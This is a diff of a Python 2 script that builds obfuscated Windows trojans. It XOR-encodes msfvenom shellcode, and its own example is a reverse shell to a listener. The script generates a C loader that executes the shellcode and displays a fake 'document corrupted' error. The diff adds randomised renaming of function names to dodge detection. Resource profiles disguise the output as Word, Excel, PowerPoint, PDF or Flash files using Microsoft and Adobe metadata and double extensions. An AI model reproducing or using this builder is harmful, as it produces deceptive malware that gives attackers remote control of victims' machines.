@@ -1,9 +1,11 @@
+#!/usr/bin/env python2
+
 """
 XOR-encoded shellcode wrapper for Windows x86-32 (works fine on x86-64)
 
 Example:
 $ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.1 LPORT=8080 \
-   2>/dev/null | python xor-payload.py -p excel
+   2>/dev/null | ./xor-payload.py -p excel
 
 @_hugsy_
 
@@ -12,7 +14,6 @@ Refs:
 
 ToDo:
 - multi byte key
-- obfuscate generated C code
 """
 
 import sys
@@ -22,18 +23,6 @@ import tempfile
 import os
 import subprocess
 import argparse
-
-HOME = os.getenv( "HOME" )
-MINGW_BIN = HOME + "/.wine/drive_c/MinGW/bin"
-ICO_DIR = HOME + "/tmp/ico"
-PROFILES = {
-        # index : [Version, /path/to/ico, CompanyName, Description, Name, CopyrightName]
-        "powerpoint":   [ICO_DIR+"/powerpoint.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft PowerPoint presentation", "PowerPoint", "Microsoft PowerPoint", "powerpoint.exe", ".pptx"],
-        "word":         [ICO_DIR+"/word.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Word document", "Word", "Microsoft Word", "word.exe", ".docx"],
-        "excel":        [ICO_DIR+"/excel.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Excel document", "Excel", "Microsoft Excel", "excel.exe", ".xlsx"],
-        "flash":        [ICO_DIR+"/flash.ico", "11,0,0,0", "Adobe Systems Incorporated", "Adobe Flash macro", "Flash", "Adobe Flash", "flash.swf", ".swf"],
-        "pdf":          [ICO_DIR+"/pdf.ico", "13,0,0,0", "Adobe Systems Incorporated", "Embedded Adobe PDF document", "Adobe PDF Reader", "Adobe AcroRead", "AcroReader.exe", ".pdf"],
-        }
 
 
 HEADERS_C_CODE = """
@@ -52,11 +41,11 @@ HEADERS_C_CODE = """
 """
 
 STUB_C_CODE = """
-DWORD WINAPI SpawnShellcode(LPVOID lpSc)
+DWORD WINAPI SpawnShellcode(LPVOID lpFuncPointer)
 {
   __asm__("movl %0, %%eax\\n\\t"
           "call %%eax"
-          : : "r"(lpSc) : "%eax");
+          : : "r"(lpFuncPointer) : "%eax");
   return 0;
 }
 
@@ -99,61 +88,61 @@ void DecodeShellcode(unsigned char* code, int len)
 """
 
 TEMPLATE_C_CODE = """
-int len = sizeof(buf);
-DWORD pID;
-char* code;
-DWORD lpflOldProtect;
-HANDLE hdlThread;
-int retcode;
+  int len = sizeof(buf);
+  DWORD pID;
+  char* code;
+  DWORD lpflOldProtect;
+  HANDLE hdlThread;
+  int retcode;
 
 #ifndef DEBUG
-FreeConsole();
+  FreeConsole();
 #endif
-if (!key) exit(1);
-code = AllocAndMap(NULL, buf, len);
-if (!code) exit(1);
+  if (!key) exit(1);
+  code = AllocAndMap(NULL, buf, len);
+  if (!code) exit(1);
 
 #ifdef DEBUG
-printf("[+] Shellcode alloc-ed at %p\\n", code);
+  printf("[+] Shellcode alloc-ed at %p\\n", code);
 #endif
 
 #ifdef DEBUG
-printf("[+] Decoding using key=%#x\\n", key);
+  printf("[+] Decoding using key=%#x\\n", key);
 #endif
-DecodeShellcode(code, len);
+  DecodeShellcode(code, len);
 
-if(!VirtualProtect(code, len, PAGE_EXECUTE_READWRITE, &lpflOldProtect)){
+  if(!VirtualProtect(code, len, PAGE_EXECUTE_READWRITE, &lpflOldProtect)){
 #ifdef DEBUG
-printf("[-] failed to set 0x%p as executable\\n", code);
+    printf("[-] failed to set 0x%p as executable\\n", code);
 #endif
-VirtualFree(code, len, MEM_RELEASE);
-exit(1);
-}
+    VirtualFree(code, len, MEM_RELEASE);
+    exit(1);
+  }
 #ifdef DEBUG
-printf("[+] Page %p set as executable\\n", code);
-printf("[+] Detaching from console and triggering shellcode\\n");
-FreeConsole();
+  printf("[+] Page %p set as executable\\n", code);
+  printf("[+] Detaching from console and triggering shellcode\\n");
+  FreeConsole();
 #endif
 
-hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);
+  hdlThread = CreateThread(NULL, 0, SpawnShellcode, code, 0, &pID);
 
-WaitForSingleObject(hdlThread, INFINITE);
-VirtualFree(code, len, MEM_RELEASE);
-"""
+  WaitForSingleObject(hdlThread, INFINITE);
+  VirtualFree(code, len, MEM_RELEASE);
+  """
 
 TEMPLATE_WIN32_CODE = """
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 """ + TEMPLATE_C_CODE + """
-MessageBoxA(NULL,
-"The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
-"If this happened for the first time, try re-opening the document."
-"\\n\\nError code: 0xffffff96"
-,
-"Windows Error",
-MB_ICONERROR | MB_OK);
+  MessageBoxA(NULL,
+  "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
+  "If this happened for the first time, try re-opening the document."
+  "\\n\\nError code: 0xffffff96"
+  ,
+  "Windows Error",
+  MB_ICONERROR | MB_OK);
 
-return retcode;
+  return retcode;
 }
 """
 
@@ -162,15 +151,15 @@ int main(int argc, char** argv, char** envp)
 {
 """ + TEMPLATE_C_CODE + """
 
-MessageBoxA(NULL,
-"The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
-"If this happened for the first time, try re-opening the document."
-"\\n\\nError code: 0xffffff96"
-,
-"Windows Error",
-MB_ICONERROR | MB_OK);
+  MessageBoxA(NULL,
+  "The document you are trying to read seems corrupted, Windows cannot proceed.\\n"
+  "If this happened for the first time, try re-opening the document."
+  "\\n\\nError code: 0xffffff96"
+  ,
+  "Windows Error",
+  MB_ICONERROR | MB_OK);
 
-return retcode;
+  return retcode;
 }
 """
 
@@ -183,14 +172,45 @@ return;
 }
 """
 
+CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+WORDS_TO_OBFUSCATE = [ "SpawnShellcode", "AllocAndMap", "DecodeShellcode", ]
+
+
+def generate_random_word():
+    length = random.randint(8, 20)
+    w = [random.choice(CHARSET) for i in xrange(length)]
+    return ''.join(w)
+
+
+def obfuscate(fname):
+    assoc = {}
+    data = file(fname).read()
+
+    for w in WORDS_TO_OBFUSCATE:
+        while True:
+            nw = generate_random_word()
+            if nw not in assoc.values():
+                assoc[w] = nw
+                break
+
+    for k,v in assoc.iteritems():
+        data = data.replace(k, v)
+
+    with open(fname, 'w') as f:
+        f.write(data)
+
+    return True
+
+
 def echo(fd, m):
-        os.write(fd, m)
-        os.fsync(fd)
-        return
+    os.write(fd, m.encode("utf-8"))
+    os.fsync(fd)
+    return
+
 
 def create_application_manifest():
-        with open("/tmp/Application.manifest", "w") as f:
-                f.write("""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+    with open("/tmp/Application.manifest", "w") as f:
+        f.write("""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
   <security>
@@ -202,19 +222,22 @@ def create_application_manifest():
  <dependency>
   <dependentAssembly>
    <assemblyIdentity type="Win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0"
-                     processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"/>
+             processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"/>
   </dependentAssembly>
  </dependency>
 </assembly>""")
-        return
+    return
+
 
 def create_resource_file( profile_index ):
-        create_application_manifest()
+    global PROFILES
 
-        prof = PROFILES[ profile_index ]
-        fd, cname = tempfile.mkstemp(suffix=".rc")
-        with os.fdopen(fd, 'w') as f:
-                f.write("""id ICON "{0}"
+    create_application_manifest()
+
+    prof = PROFILES[ profile_index ]
+    fd, cname = tempfile.mkstemp(suffix=".rc")
+    with os.fdopen(fd, 'w') as f:
+        f.write("""id ICON "{0}"
 CREATEPROCESS_MANIFEST_RESOURCE_ID RT_MANIFEST "/tmp/Application.manifest"
 1 VERSIONINFO
 FILEVERSION      {1}
@@ -242,132 +265,151 @@ BEGIN
   END
 END
 """.format(*prof))
-        return cname
+    return cname
+
 
 def generate_code_file(fd, key, template="win32"):
-        i = 1
-        echo(fd, HEADERS_C_CODE)
+    i = 1
+    echo(fd, HEADERS_C_CODE)
 
-        echo(fd, "unsigned char key = %d;\n" % key)
-        echo(fd, 'unsigned char buf[]=\n')
-        echo(fd, '"')
-        while True:
-                c = sys.stdin.read(1)
-                if len(c) == 0: break
-                a = ord(c) ^ key
-                echo(fd, "\\x%.2x" % a)
-                if i % 15 == 0:
-                        echo(fd, '"\n')
-                        echo(fd, '"')
-                i += 1
-                key = (key + 1)%256
-        echo(fd, '";\n')
+    echo(fd, "unsigned char key = %d;\n" % key)
+    echo(fd, 'unsigned char buf[]=\n')
+    echo(fd, '"')
+    while True:
+        c = sys.stdin.read(1)
+        if len(c) == 0: break
+        a = ord(c) ^ key
+        echo(fd, "\\x%.2x" % a)
+        if i % 15 == 0:
+            echo(fd, '"\n')
+            echo(fd, '"')
+        i += 1
+        key = (key + 1)%256
+    echo(fd, '";\n')
 
-        echo(fd, STUB_C_CODE)
+    echo(fd, STUB_C_CODE)
 
-        if template == "win32":
-                echo(fd, TEMPLATE_WIN32_CODE)
-        elif template == "exe":
-                echo(fd, TEMPLATE_EXE_CODE)
-        elif template == "dll":
-                echo(fd, TEMPLATE_DLL_CODE)
+    if template == "win32":
+        echo(fd, TEMPLATE_WIN32_CODE)
+    elif template == "exe":
+        echo(fd, TEMPLATE_EXE_CODE)
+    elif template == "dll":
+        echo(fd, TEMPLATE_DLL_CODE)
 
-        os.close(fd)
-        return
+    os.close(fd)
+    return
+
 
 if __name__ == "__main__":
-        profile_name = None
-	res_o = ""
-        quiet_mode = False
-        available_profiles = ["powerpoint", "excel", "word", "flash", "pdf"]
+    res_o = ""
+    available_profiles = ["powerpoint", "excel", "word", "flash", "pdf"]
+    HOME = os.getenv("HOME")
 
-        parser = argparse.ArgumentParser(description=__doc__)
-        parser.add_argument("-p", "--profile", default=None, metavar="PROFILE",
-                            help="Specify the profile to use ({})".format(available_profiles))
-        parser.add_argument("-q", "--quiet", action="store_true", help="Disable verbose output", default=False)
-        parser.add_argument("-o", "--output", default=None, help="Specify an output file")
-        parser.add_argument("-d", "--dll", default=False, action="store_true", help="Generate a DLL")
-        parser.add_argument("-e", "--exe", default=False, action="store_true", help="Generate a PE Console")
-        parser.add_argument("-w", "--win32", default=True, action="store_true", help="Generate a PE GUI (default)")
-        args = parser.parse_args()
+    parser = argparse.ArgumentParser(description="Yet another payload encoder")
+    parser.add_argument("-p", "--profile", default=None, metavar="PROFILE",
+                        help="Specify the profile to use ({})".format(available_profiles))
+    parser.add_argument("-q", "--quiet", action="store_true", help="Disable verbose output", default=False)
+    parser.add_argument("-o", "--output", default=None, help="Specify an output file")
+    parser.add_argument("--dll", default=False, action="store_true", help="Generate a DLL")
+    parser.add_argument("--exe", default=False, action="store_true", help="Generate a PE Console")
+    parser.add_argument("--win32", default=True, action="store_true", help="Generate a PE GUI (default)")
 
-        profile_name = args.profile
-        quiet_mode = args.quiet
+    parser.add_argument("--gcc-path", default=HOME + "/.wine/drive_c/MinGW/bin", dest="bin", help="Specify path to MinGW GCC binary directory")
+    parser.add_argument("--ico-path", default=HOME + "/tmp/ico", dest="ico", help="Specify path to icons/ directory")
 
-        if profile_name is not None and profile_name not in available_profiles:
-                print("[-] Invalid profile")
-                exit(1)
+    args = parser.parse_args()
 
-        if not quiet_mode:
-                print ("[+] Generating random key")
-
-        key = random.randint(0,255)
-        fd, cname = tempfile.mkstemp(suffix=".c")
-
-        if not quiet_mode:
-                print ("[+] Generating code in '{}'".format(cname))
-
-        if args.exe:
-                generate_code_file(fd, key, "exe")
-        elif args.dll:
-                generate_code_file(fd, key, "dll")
-        else:
-                generate_code_file(fd, key, "win32")
-
-        if profile_name is not None and not args.dll:
-                if not quiet_mode:
-                        print("[+] Using profile %s" % profile_name.title())
-		resfile = create_resource_file( profile_name )
-		res_o = "/tmp/res.o"
-		cmd = "cd {} && wine ./windres.exe {} -O coff -o {}".format(MINGW_BIN, resfile, res_o)
-		if not quiet_mode:
-                        print("[+] Generating resources '{}'->'{}'".format(resfile, res_o))
-		ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
-		os.unlink(resfile)
-        else:
-                if not quiet_mode:
-                        print("[+] Profile ignored")
+    if args.profile is not None and args.profile not in available_profiles:
+        print("[-] Invalid profile")
+        sys.exit(1)
 
 
-	suffix = PROFILES[ profile_name ][7] if profile_name is not None else ""
+    PROFILES = {
+        # index : [Version, /path/to/ico, CompanyName, Description, Name, CopyrightName]
+        "powerpoint":   [args.ico+"/powerpoint.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft PowerPoint presentation", "PowerPoint", "Microsoft PowerPoint", "powerpoint.exe", ".pptx"],
+        "word":         [args.ico+"/word.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Word document", "Word", "Microsoft Word", "word.exe", ".docx"],
+        "excel":        [args.ico+"/excel.ico", "14,0,0,0", "Microsoft Corporation", "Microsoft Excel document", "Excel", "Microsoft Excel", "excel.exe", ".xlsx"],
+        "flash":        [args.ico+"/flash.ico", "11,0,0,0", "Adobe Systems Incorporated", "Adobe Flash macro", "Flash", "Adobe Flash", "flash.swf", ".swf"],
+        "pdf":          [args.ico+"/pdf.ico", "13,0,0,0", "Adobe Systems Incorporated", "Embedded Adobe PDF document", "Adobe PDF Reader", "Adobe AcroRead", "AcroReader.exe", ".pdf"],
+    }
 
-        if args.output is None:
-                if args.dll:
-                        f, ename = tempfile.mkstemp(suffix=suffix + ".dll")
-                else:
-                        f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
-                os.close(f)
-        else:
-                ename = args.output
+    if not args.quiet:
+        print ("[+] Generating random key")
 
+    key = random.randint(0,255)
+    fd, cname = tempfile.mkstemp(suffix=".c")
+
+    if not args.quiet:
+        print ("[+] Generating code in '{}'".format(cname))
+
+    if args.exe:
+        generate_code_file(fd, key, "exe")
+    elif args.dll:
+        generate_code_file(fd, key, "dll")
+    else:
+        generate_code_file(fd, key, "win32")
+
+    if not args.quiet:
+        print ("[+] Obfuscating '{}'".format(cname))
+
+    obfuscate(cname)
+
+    if args.profile is not None and not args.dll:
+        if not args.quiet:
+            print("[+] Using profile %s" % args.profile.title())
+            resfile = create_resource_file( args.profile )
+            res_o = "/tmp/res.o"
+            cmd = "cd {} && wine ./windres.exe {} -O coff -o {}".format(args.bin, resfile, res_o)
+        if not args.quiet:
+            print("[+] Generating resources '{}'->'{}'".format(resfile, res_o))
+            ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
+            os.unlink(resfile)
+    else:
+        if not args.quiet:
+            print("[+] Profile ignored")
+
+
+    suffix = PROFILES[ args.profile ][7] if args.profile is not None else ""
+
+    if args.output is None:
         if args.dll:
-                cmd = "cd {0} && wine ./gcc.exe {1} -shared -o {2}  -Wl,--out-implib,{2}.a".format(MINGW_BIN, cname, ename)
-        elif args.exe:
-                cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
+            f, ename = tempfile.mkstemp(suffix=suffix + ".dll")
         else:
-                cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(MINGW_BIN, cname, res_o, ename)
+            f, ename = tempfile.mkstemp(suffix=suffix + ".exe")
+            os.close(f)
+    else:
+        ename = args.output
 
-        if not quiet_mode:
-                print("[+] Compiling '{}'->'{}'".format(cname, ename))
+    if args.dll:
+        cmd = "cd {0} && wine ./gcc.exe {1} -shared -o {2}  -Wl,--out-implib,{2}.a".format(args.bin, cname, ename)
+    elif args.exe:
+        cmd = "cd {} && wine ./gcc.exe {} {} -o {}".format(args.bin, cname, res_o, ename)
+    else:
+        cmd = "cd {} && wine ./gcc.exe -D_UNICODE -DUNICODE -DWIN32 -D_WINDOWS -mwindows {} {} -o {}".format(args.bin, cname, res_o, ename)
 
-        ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
+    if not args.quiet:
+        print("[+] Compiling '{}'->'{}'".format(cname, ename))
 
-        if not quiet_mode:
-                print("[+] Generation completed '{}', removing resources...".format(ename))
+    ret = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,)
 
-	if profile_name is not None:
-		os.unlink(res_o)
-                if not args.dll:
-                        os.unlink("/tmp/Application.manifest")
+    if not args.quiet:
+        print("[+] Generation completed '{}', removing resources...".format(ename))
 
-        os.unlink(cname)
+        if args.profile is not None:
+            os.unlink(res_o)
+            if not args.dll:
+                os.unlink("/tmp/Application.manifest")
 
-        if not quiet_mode:
-                print("[+] Success")
+    os.unlink(cname)
+    if args.dll:
+        os.unlink(ename + ".a")
 
-        if quiet_mode:
-                print("{}".format(ename))
+    if not args.quiet:
+        print("[+] Success")
 
-        sys.stdout.flush()
-        sys.stderr.flush()
-        exit(0)
+    if args.quiet:
+        print("{}".format(ename))
+
+    sys.stdout.flush()
+    sys.stderr.flush()
+    sys.exit(0)
